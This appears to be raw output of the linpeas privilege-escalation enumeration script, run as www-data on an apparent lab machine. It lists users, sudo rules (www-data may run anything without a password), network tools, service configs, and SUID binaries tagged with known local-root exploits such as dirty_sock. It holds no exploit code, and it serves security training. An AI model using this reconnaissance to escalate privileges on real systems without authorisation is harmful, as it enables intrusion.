/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                   1 systemd         root             :1.0          init.scope                -          -     
:1.1                                1164 accounts-daemon[0m root             :1.1          accounts-daemon.service   -          -  
:1.10                               9130 busctl          www-data         :1.10         apache2.service           -          -     
:1.2                                1205 systemd-logind  root             :1.2          systemd-logind.service    -          -     
:1.3                                1251 polkitd         root             :1.3          polkitd.service           -          -     
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts            1164 accounts-daemon[0m root             :1.1          accounts-daemon.service   -          -  
org.freedesktop.DBus                1154 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1          1251 polkitd         root             :1.3          polkitd.service           -          -     
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1              1205 systemd-logind  root             :1.2          systemd-logind.service    -          -     
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -     
org.freedesktop.timedate1              - -               -                (activatable) -                         -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
ip-10-10-30-160
127.0.0.1 localhost

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
nameserver 10.0.0.2
search eu-west-1.compute.internal
eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:00:26:93:ef:d1
          inet addr:10.10.30.160  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::26ff:fe93:efd1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:406381 errors:0 dropped:0 overruns:0 frame:0
          TX packets:389376 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:58868569 (58.8 MB)  TX bytes:194855665 (194.8 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:544 errors:0 dropped:0 overruns:0 frame:0
          TX packets:544 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:49304 (49.3 KB)  TX bytes:49304 (49.3 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

╔══════════╣ Can I sniff with tcpdump?
No



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on ip-10-10-30-160.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-30-160.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:51:53 up  1:33,  0 users,  load average: 0.47, 0.11, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Sun Dec 26 17:18:05 2021   still running                         0.0.0.0
ubuntu   pts/0        Sun Feb 10 16:58:34 2019 - Sun Feb 10 17:06:14 2019  (00:07)     89.238.150.25
reboot   system boot  Sun Feb 10 16:57:15 2019   still running                         0.0.0.0
ubuntu   pts/0        Sun Feb 10 16:24:22 2019 - Sun Feb 10 16:56:40 2019  (00:32)     89.238.150.25
reboot   system boot  Sun Feb 10 16:22:08 2019 - Sun Feb 10 16:56:43 2019  (00:34)     0.0.0.0
ubuntu   pts/0        Sun Feb 10 13:59:42 2019 - Sun Feb 10 14:00:04 2019  (00:00)     89.238.150.25
reboot   system boot  Sun Feb 10 13:58:09 2019 - Sun Feb 10 16:56:43 2019  (02:58)     0.0.0.0

wtmp begins Sun Feb 10 13:58:09 2019

╔══════════╣ Last time logon each user
Username         Port     From             Latest
ubuntu           pts/0    89.238.150.25    Sun Feb 10 16:58:34 +0000 2019

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                       ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                              4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                            5.4.0-6ubuntu1~16.04.11                    amd64        GNU C++ compiler
ii  gcc                              4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                            5.4.0-6ubuntu1~16.04.11                    amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Apache Files (limit 70)
Version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2018-06-07T19:43:03
httpd Not Found

══╣ PHP exec extensions
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
drwxr-xr-x 2 root root 4096 Feb 10  2019 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Feb 10  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Feb 10  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf


-rw-r--r-- 1 root root 1332 Jun 11  2018 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
lrwxrwxrwx 1 root root 35 Feb 10  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

-rw-r--r-- 1 root root 70999 Sep 13  2018 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Sep 13  2018 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70999 Sep 13  2018 /etc/php/7.0/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Nov 14  2018 /etc/ldap


╔══════════╣ Searching ssl/ssh files
find: './systemd-private-2d0335c1cfd54bc58f9afcd4aae53e2b-systemd-timesyncd.service-flwc7U': Permission denied
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PasswordAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core/5742/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/5742/etc/ssl/certs/ACEDICOM_Root.pem
/snap/core/5742/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/5742/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/5742/etc/ssl/certs/AddTrust_External_Root.pem
/snap/core/5742/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/snap/core/5742/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/snap/core/5742/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/snap/core/5742/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/5742/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/5742/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/5742/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/5742/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/5742/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/5742/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/5742/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/5742/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/5742/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/5742/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
1950PSTORAGE_CERTSBIN

./linpeas.sh: 2695: ./linpeas.sh: gpg-connect-agent: not found
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov 14  2018 /etc/pam.d
-rw-r--r-- 1 root root 2133 Nov  5  2018 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux 2.1


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3169 Oct 17  2018 /etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3169 Aug  1  2018 /snap/core/5742/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3169 Oct 17  2018 /snap/core/6350/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Oct 16  2018 /snap/core/5742/usr/share/keyrings
drwxr-xr-x 2 root root 121 Jan 29  2019 /snap/core/6350/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Nov 14  2018 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 Nov 14  2018 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core/5742/etc/pam.d/passwd
passwd file: /snap/core/5742/etc/passwd
passwd file: /snap/core/5742/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/5742/var/lib/extrausers/passwd
passwd file: /snap/core/6350/etc/pam.d/passwd
passwd file: /snap/core/6350/etc/passwd
passwd file: /snap/core/6350/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/6350/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 12255 Nov 14  2018 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 13395 Oct 16  2018 /snap/core/5742/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/5742/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/5742/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/5742/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Jan 29  2019 /snap/core/6350/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/6350/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/6350/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/6350/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Nov 14  2018 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg


╔══════════╣ Analyzing Cache Vi Files (limit 70)

-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 /home/ubuntu/.viminfo

╔══════════╣ Kubernetes information

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/5742/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/6350/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)


-rw-r--r-- 1 root root 69 Sep 13  2018 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Sep 13  2018 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 /home/ubuntu/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/5742/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/6350/etc/skel/.bashrc





-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 ubuntu ubuntu 655 May 16  2017 /home/ubuntu/.profile
-rw-r--r-- 1 root root 655 May 16  2017 /snap/core/5742/etc/skel/.profile
-rw-r--r-- 1 root root 655 May 16  2017 /snap/core/6350/etc/skel/.profile



-rw-r--r-- 1 ubuntu ubuntu 0 Feb 10  2019 /home/ubuntu/.sudo_as_admin_successful



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 40K May 16  2018 /snap/core/5742/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/5742/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/5742/bin/ping6
-rwsr-xr-x 1 root root 40K May 17  2017 /snap/core/5742/bin/su
-rwsr-xr-x 1 root root 27K May 16  2018 /snap/core/5742/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K May 17  2017 /snap/core/5742/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K May 17  2017 /snap/core/5742/usr/bin/chsh
-rwsr-xr-x 1 root root 74K May 17  2017 /snap/core/5742/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 17  2017 /snap/core/5742/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K May 17  2017 /snap/core/5742/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jul  4  2017 /snap/core/5742/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-network 42K Jan 12  2017 /snap/core/5742/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Jan 18  2018 /snap/core/5742/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 97K Oct 15  2018 /snap/core/5742/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 382K Jan 29  2016 /snap/core/5742/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K May 16  2018 /snap/core/6350/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/6350/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/6350/bin/ping6
-rwsr-xr-x 1 root root 40K May 17  2017 /snap/core/6350/bin/su
-rwsr-xr-x 1 root root 27K May 16  2018 /snap/core/6350/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K May 17  2017 /snap/core/6350/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K May 17  2017 /snap/core/6350/usr/bin/chsh
-rwsr-xr-x 1 root root 74K May 17  2017 /snap/core/6350/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 17  2017 /snap/core/6350/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K May 17  2017 /snap/core/6350/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jul  4  2017 /snap/core/6350/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-network 42K Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 97K Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/6350/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 23K Jul 13  2018 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 419K Nov  5  2018 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 97K Jul 19  2018 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 15K Jul 13  2018 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/5742/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/5742/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K May 17  2017 /snap/core/5742/usr/bin/chage
-rwxr-sr-x 1 root systemd-timesync 36K Apr  5  2016 /snap/core/5742/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/5742/usr/bin/dotlockfile
